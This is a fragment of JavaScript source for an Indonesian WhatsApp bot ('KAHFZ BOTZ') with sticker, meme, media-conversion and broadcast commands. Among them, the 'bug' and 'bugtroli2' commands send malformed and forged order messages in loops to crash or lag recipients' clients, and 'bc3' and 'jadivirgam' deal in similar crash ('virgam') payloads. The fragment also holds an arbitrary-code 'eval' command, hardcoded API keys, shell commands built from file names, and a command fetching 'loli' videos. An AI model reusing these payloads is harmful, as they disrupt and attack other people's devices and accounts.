 .on('error', function(err) {
console.log(err)
reply(mess.error.api)
fs.unlinkSync(file_name)
 })
 .on('end', function() {
console.log('Finish')
exec(`webpmux -set exif ./sticker/data.exif ./${file_name2} -o ./${file_name2}`, async (error) => {
  if (error) return reply(mess.error.api)
kahfzz.sendMessage(from, fs.readFileSync(file_name2), sticker, {quoted: kahfz})

 fs.unlinkSync(file_name)
 fs.unlinkSync(file_name2)
  })
 })
 .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(file_name2)
  });
})
 } else {
reply(`Kirim gambar dengan caption ${prefix}snobg atau tag gambar yang sudah dikirim`)
 }


 break
 case "triggered2":
 case 'tiger2':
 if (isImage || isQuotedImage) {
  var lin = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
  var dow = await kahfzz.downloadAndSaveMediaMessage(lin)
  var tolink = await uptotele(dow)
  ranp = getRandom('.gif')
  rano = getRandom('.webp')
  var ini_buffer = `https://some-random-api.ml/canvas/triggered?avatar=${tolink}`
  exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
kahfzz.sendMessage(from, fs.readFileSync(rano), sticker, { quoted: kahfz }).then(() => {
  fs.unlinkSync(rano)
})
 })
} else {
  reply("only foto")
}
break
case 'ttg':
teks = args.join(' ')
mek = encodeURIComponent(teks)
if (args.length < 2) return 
 let ane = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=Mythia-Chan&text=${mek}`)
  fs.writeFileSync('./sticker/ttg.webp', ane)
  exec(`webpmux -set exif ./sticker/data.exif ./sticker/ttg.webp -o ./sticker/ttg.webp`, async (error) => {
 if (error) return reply(mess.error.api)
kahfzz.sendSticker(from, fs.readFileSync(`./sticker/ttg.webp`), sticker, {quoted: freply})
 
 fs.unlinkSync(`./sticker/ttg.webp`)	
  })

  break
  case 'loliv':
  case 'lolivid':
  case 'lolivideo':
  reply(mess.wait)
  anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
  .then(async (body) => {
 anu = body.split('\n')
 anu = anu[Math.floor(Math.random() * anu.length)]
 sendMediaURL(from, anu)
  })
  .catch(async (err) => {
 console.error(err)
 reply(`${err}`)
  })
  break


  case 's2':{


 if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await kahfzz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
  console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
  console.log(`Error : ${err}`)
  fs.unlinkSync(media)
  reply(mess.error.api)
})
.on('end', function () {
  console.log('Finish')
  exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
 if (error) return reply(mess.error.api)
  kahfzz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: kahfz})

fs.unlinkSync(media)	
fs.unlinkSync(`./sticker/${sender}.webp`)	
 })
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
 } else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await kahfzz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
reply(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
  console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
  console.log(`Error : ${err}`)
  fs.unlinkSync(media)
  let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
  reply(mess.error.api)
})
.on('end', function () {
  console.log('Finish')
  exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
  kahfzz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: kahfz})

fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
 })
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
 } else {
reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
 }
  }
  break
  case 'gifstiker':
  case 's':
  case 'stickergif':  
  case 'sticker':
  case 'stiker':
  if ((isMedia && !kahfz.message.videoMessage || isQuotedImage) && args.length == 0) {
 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
 const media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 ran = '666.webp'
 await ffmpeg(`./${media}`)
 .input(media)
 .on('start', function (cmd) {
  console.log(`Started : ${cmd}`)
})
 .on('error', function (err) {
  console.log(`Error : ${err}`)
  fs.unlinkSync(media)
  reply('error')
})
 .on('end', function () {
console.log('Finish')
kahfzz.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
fs.unlinkSync(media)
fs.unlinkSync(ran)
 })
 .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(ran)
  } else if ((isMedia && kahfz.message.videoMessage.seconds < 11 || isQuotedVideo && kahfz.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
 const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kahfz
 const media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 ran = '999.webp'
 reply(mess.wait)
 await ffmpeg(`./${media}`)
 .inputFormat(media.split('.')[1])
 .on('start', function (cmd) {
console.log(`Started : ${cmd}`)
 })
 .on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
 })
 .on('end', function () {
console.log('Finish')
kahfzz.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: freply})
fs.unlinkSync(media)
fs.unlinkSync(ran)
 })
 .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(ran)
  } else {
 reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
  }
  break
  case 'take':
  case 'colong':
  if (!isQuotedSticker) return reply('Stiker aja om')
 encmedia = JSON.parse(JSON.strngify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  anu = args.join(' ').split('|')
  satu = anu[0] !== '' ? anu[0] : `${pushname}`
  dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
  require('./lib/fetch.js').createExif(satu, dua)
  require('./lib/fetch.js').modStick(media, kahfzz, kahfz, from)
  break
  case 'delwm':
  if (!isQuotedSticker) return reply('Stiker aja om')
 encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  anu = args.join(' ').split('|')
  satu = anu[0] !== '' ? anu[0] : ``
  dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
  require('./lib/fetch.js').createExif(satu, dua)
  require('./lib/fetch.js').modStick(media, kahfzz, kahfz, from)
  break
  case 'stikerwm':
  case 'stickerwm':
  case 'swm':
  var a = arg.split("|")[0];
  var b = arg.split("|")[1];
  if (isMedia && !kahfz.message.videoMessage || isQuotedImage ) {
 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
 media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 await createExif(a,b)
 out = getRandom('.webp')
 ffmpeg(media)
 .on('error', (e) => {
console.log(e)
kahfzz.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: freply })
fs.unlinkSync(media)
 })
 .on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
.on('exit', () => {
  kahfzz.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: freply })
  fs.unlinkSync(out)
  fs.unlinkSync(_out)
  fs.unlinkSync(media)
})
 })
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(out) 
  } else if ((isMedia && kahfz.message.videoMessage.seconds < 11 || isQuotedVideo && kahfz.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
 const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
 const media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
 pe = args.join('')
 var a = pe.split("|")[0];
 var b = pe.split("|")[1];
 await createExif(a,b)
 out = getRandom('.webp')
 ffmpeg(media)
 .on('error', (e) => {
console.log(e)
kahfzz.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: freply })
fs.unlinkSync(media)
 })
 .on('end', () => {
_out = getRandom('.webp')
spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
.on('exit', () => {
  kahfzz.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: freply })
  fs.unlinkSync(out)
  fs.unlinkSync(_out)
  fs.unlinkSync(media)
})
 })
 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
 .toFormat('webp')
 .save(out) 
  } else {
 reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
  }
  break
  case 'toimg':
  if (!isQuotedSticker) return reply('reply stickernya')
 reply(mess.wait)
  encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
  ran = getRandom('.png')
  exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
buffer = fs.readFileSync(ran)
 kahfzz.sendMessage(from, buffer, image, {quoted: freply, caption: 'Nih'})
 fs.unlinkSync(ran)
  })
  break
  case 'smeme': 
  reply('Loading.... ')
  top = arg.split('|')[0]
  bottom = arg.split('|')[1]
  var imgbb = require('imgbb-uploader')
  if ((isMedia && !kahfz.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
 ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz 
 owgi = await  kahfzz.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("bf0832d1bbee804ec793d4a830a26238", owgi)
 teks = `${anu.display_url}`
 ranp = getRandom('.gif')
 rano = getRandom('.webp')
 anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
 sendStickerUrl(from, `${anu1}`)
  } else {
 reply('Gunakan foto/stiker!')
  }
  break

  case 'memeimg':
  case 'memegen': 
  top = arg.split('|')[0]
  bottom = arg.split('|')[1]
  var imgbb = require('imgbb-uploader')
  if ((isMedia && !kahfz.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
 reply(mess.wait)
 ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz 
 owgi = await kahfzz.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("f643a4d2fb9ea99221cb4a3432d6a4ba", owgi)
 teks = `${anu.display_url}`
 ranp = getRandom('.gif')
 rano = getRandom('.webp')
 anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
 sendMediaURL(from, `${anu1}`, mess.success)
  } else {

  }
  break
  case 'togif':
  if ((isMedia && !kahfz.message.videoMessage || isQuotedSticker) && args.length == 0) {
reply(mess.wait)
encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
mediaaa = await kahfzz.downloadAndSaveMediaMessage(encmediaaa)
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
kahfzz.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: freply, caption: mess.success})
fs.unlinkSync(mediaaa)
 } else {
reply(mess.wrongFormat)
 }
 break
 case 'tovideo':
 if ((isMedia && !kahfz.message.videoMessage || isQuotedSticker) && args.length == 0) {
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
mediaaa = await kahfzz.downloadAndSaveMediaMessage(encmediaaa)
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
kahfzz.sendMessage(from, mp4, video, {mimetype: 'video/mp4', quoted: freply, caption: mess.success})
fs.unlinkSync(mediaaa)
 } else {
reply(mess.wrongFormat)
 }
 break
 case 'tomp3':
 kahfzz.updatePresence(from, Presence.composing)
 if (!isQuotedVideo) return reply('Itu bukan video')
  encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
  fs.unlinkSync(media)
  if (err) return reply(mess.error)
 buffer = fs.readFileSync(ran)
  kahfzz.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4'})
  fs.unlinkSync(ran)
})
break

//------------------< Ingfo Bot >-------------------
case 'runtime':
textImg(`${runtime(process.uptime())}`)
break
case 'alldonasi': 
case 'donasi22':
textImg(setting.txtDonasi)
break
case 'sourcecode': 
case 'sc': 
case 'src':
textImg(`Bot ini menggunakan sc : FOLLOW DULU IG OWNER NANTI DI UP AWOWKKWK`)
break
case 'ping':
case 'speed':
timestampe = speed();
latensie = speed() - timestampe
reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
break
case 'botstat':
groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
uptime = process.uptime();
timestampe = speed();
totalChat = await kahfzz.chats.all()
latensie = speed() - timestampe
total = math(`${groups.length}*${privat.length}`)
teks = `\`\`\`BOT STATISTICS\`\`\`
\`\`\`🐥 Group Chats : ${groups.length}\`\`\`
\`\`\`🐥 Private Chats : ${privat.length}\`\`\`
\`\`\`🐥 Total Chats : ${totalChat.length}\`\`\`
\`\`\`🐥 Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`?? Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\`🐥 Baterai : ${baterai}% ${charger}\`\`\`
\`\`\`🐥 Ram Usage : ${ram2}\`\`\`
\`\`\`?? Platform : ${os.platform()}\`\`\`
\`\`\`🐥 Hostname : ${os.hostname()}\`\`\`
\`\`\`🐥 Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\`🐥 Wa Version: ${kahfzz.user.phone.wa_version}\`\`\`
\`\`\`🐥 Os Version: ${kahfzz.user.phone.os_version}\`\`\`
\`\`\`🐥 Device Manufacturer: ${kahfzz.user.phone.device_manufacturer}\`\`\`
\`\`\`🐥 Device Model: ${kahfzz.user.phone.device_model}\`\`\`
\`\`\`🐥 Os Build Number: ${kahfzz.user.phone.os_build_number}\`\`\``
reply(teks)
break  

//------------------< Owner >-------------------
case 'addupdate':
if (!isOwner) return reply(mess.only.owner)
 if (!q) return reply(`Example: ${command} update fitur`)
_update.push(q)
 fs.writeFileSync('./database/bot/update.json', JSON.stringify(_update))
 reply(`Update fitur berhasil ditambahkan ke database!`)
 break
 case 'update':
 let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
 for (let i of _update) {
updateList += `࿃ *${i.replace(_update)}*\n\n`
 }
 textImg(updateList)
 break
 case 'reset':
 if (!isOwner) return reply(mess.only.owner)
var reset = []
 glimit = reset
 _update = reset
 console.log('Hang tight, it\'s time to reset')
 fs.writeFileSync('./database/bot/glimit.json', JSON.stringify(glimit))
 fs.readFileSync('./database/bot/update.json', JSON.stringify(_update))
 textImg('Oke Desu ~')
 break
 case 'exif':
 if (!isOwner) return  reply(mess.only.owner)
if (!q) return reply(mess.wrongFormat)
  if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
 exif.create(arg.split('|')[0], arg.split('|')[1])
  reply('sukses')
  break	
  case 'join': 
  if (!q) return reply('Linknya?')
 if (!isOwner) return reply(mess.only.owner)
if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
  link = args[0].replace('https://chat.whatsapp.com/','')
fak = kahfzz.query({ json: ['action', 'invite', link],
  expect200: true })
reply('Berhasil Masuk Grup')
break
case 'eval':
try {
  if (!isOwner) return
 sy = args.join(' ')
  return eval(sy)
} catch(e) {
  reply(`${e}`)
}
break
case 'getquoted':
reply(JSON.stringify(kahfz.message.extendedTextMessage.contextInfo, null, 3))
break
case 'bcu':
case 'broadcastu':
if (!isOwner) return  reply(mess.only.owner)
  if (args.length < 1) return reply('teks?')
 anu = await kahfzz.chats.all()
  if (isMedia && !kahfz.message.videoMessage || isQuotedImage) {
 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
 bc = await kahfzz.downloadMediaMessage(encmedia)
 for (let _ of anu) {
kahfzz.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
 }
 reply('Suksess broadcast')
  }
  break
case 'bctext':
      case 'broadcasttext':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await kahfzz.chats.all()
             if (isMedia && !kahfz.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kahfz
             bc = await kahfzz.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             	tes = `${body.slice(4)}`
             	kahfzz.sendMessage(_.jid, bc, { contentText: `${tes}`, footerText: `_Broadcast Message By Kahfz_`, buttons: [{buttonId: `${prefix}menu`,buttonText:{displayText: 'MENU'},type:1},{buttonId: `${prefix}sewabot`,buttonText:{displayText:'SEWABOT'},type:1}],headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: image, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
             	tes = `${body.slice(4)}`
             kahfzz.sendMessage(_.jid, { contentText: `${tes}`, footerText: `*_Broadcast Message By Kahfz_*`, buttons: [{buttonId: `${prefix}menu`,buttonText:{displayText: 'MENU'},type:1},{buttonId: `${prefix}sewabot`,buttonText:{displayText:'SEWABOT'},type:1}],headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fs.readFileSync('./media/Menu.jpg'), contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
}
             reply('Suksess broadcast')
}
             break
case 'bc2':
      case 'broadcast2':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await kahfzz.chats.all()
             if (isMedia && !kahfzz.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await kahfzz.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             kahfzz.sendMessage(_.jid, bc, image, {quoted:mek,caption: `*「 KAHFZ - BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
kahfzz.sendMessage(_.jid, 
			{"contentText": `*「 KAHFZ - BOT 」*\n\n${body.slice(4)}`,
			"footerText": 'KAHFZBotz',
			"buttons": [
			{"buttonId": `morning`,
			"buttonText": {"displayText": "MORNING JUGA LORD"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
case 'morning':
reply(`_Morning Juga Bro !!_`)
break
case 'bc3':
             if (!isOwner && !kahfz.key.fromMe) return  reply(mess.only.owner)

             if (args.length < 1) return reply('teks?')

             anu100 = await kahfzz.chats.all()

             if (isMedia && !kahfzz.message.videoMessage || isQuotedImage) {

             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Kahfz

             bc1000 = await kahfzz.downloadMediaMessage(encmedia)

             for (let _ of anu1000) {

             kahfzz.sendMessage(_.jid, bc1000, image, {quoted: freply, caption: `*「 KAHFZ GAMTENG 」*\n\n${body.slice(4)}`})

}

             reply('Suksess broadcast')

             } else {

             for (let _ of anu100) {

             kahfzz.sendMessage(_.jid, 

			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,

			"footerText": 'Created BY KAHFZ BOTZ',

			"buttons": [{ buttonId: noprefix ? "menu" : "!"+"menu", buttonText: { displayText: '🌛MENU🌛' }, type: 1 },{ buttonId: noprefix ? "donasi" : "!"+"donasi", buttonText: { displayText: 'DONASI' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: '📝SEWA' }, type: 1 } ], "headerType": "DOCUMENT", "documentMessage": {
            "url": "https://mmg.whatsapp.net/d/f/Ano5cGYOFQnC51uJaqGBWiCrSJH1aDCi8-YPQMMb1N1y.enc",
            "mimetype": "application/pdf",
            "title": "KirBotz.pdf",
            "fileSha256": "8Xfe3NQDhjwVjR54tkkShLDGrIFKR9QT5EsthPyxDCI=",
            "fileLength": "999999999999",
            "pageCount": 999,
            "mediaKey": "XWv4hcnpGY51qEVSO9+e+q6LYqPR3DbtT4iqS9yKhkI=",
            "fileName": "KahfzBot",
            "fileEncSha256": "NI9ykWUcXKquea4BmH7GgzhMb3pAeqqwE+MTFbH/Wk8=",
            "directPath": "/v/t62.7119-24/35160407_568282564396101_3119299043264875885_n.enc?ccb=11-4&oh=d43befa9a76b69d757877c3d430a0752&oe=61915CEC",
            "mediaKeyTimestamp": "1634472176",
            "jpegThumbnail": fs.readFileSync('./media/Menu.jpg'),
  }}, MessageType.buttonsMessage,{ quoted: troli,sendEphemeral: true, contextInfo:{"forwardingScore":999,"isForwarded":true, "externalAdReply":{"title": `Hai Kak ${pushname}`, "body": `YT : KahfzBotz×`, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/fb96c83696dfa25aa9e22.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/VUXyQJ5kACE`}}})

}

             reply('Suksess broadcast')

}

             break
case 'bc5':
             if (!isOwner && !kahfz.key.fromMe) return  reply(mess.only.owner)

             if (args.length < 1) return reply('teks?')

             anu100 = await kahfzz.chats.all()

             if (isMedia && !kahfzz.message.videoMessage || isQuotedImage) {

             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Kahfz

             bc1000 = await kahfzz.downloadMediaMessage(encmedia)

             for (let _ of anu1000) {

             kahfzz.sendMessage(_.jid, bc1000, image, {quoted: freply, caption: `*「 KAHFZ GAMTENG 」*\n\n${body.slice(4)}`})

}

             reply('Suksess broadcast')

             } else {

             for (let _ of anu100) {

             kahfzz.sendMessage(_.jid, 

			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,

			"footerText": 'Created BY KAHFZ BOTZ',

			"buttons": [{ buttonId: noprefix ? "menu" : "!"+"menu", buttonText: { displayText: '🌛MENU🌛' }, type: 1 },{ buttonId: noprefix ? "donasi" : "!"+"donasi", buttonText: { displayText: 'DONASI' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: '📝SEWA' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')

}

             reply('Suksess broadcast')

}

             break
case 'bug':
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await kahfzz.toggleDisappearingMessages(from, 0)
}
reply('Sukses Send Bug Sebanyak '+args.join(' '))
					break
case 'bugtroli2':
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `KAHFZBOT`
		        var grousp = await pemuda.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: kahfz },
                    quoted: kahfz
                }
		        for (let i = 0; i < args[0]; i++) {
		        kahfzz.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `KAHFZ BOTZ`,
						"orderTitle": `KAHFZ`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        kahfzz.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `KAHFZBOT`,
						"orderTitle": `KAHFZ`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'jadivirgam':
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (kahfz.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(kahfz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await kahfzz.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							pemuda.sendMessage(from, buffer, image, {quoted: freply, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
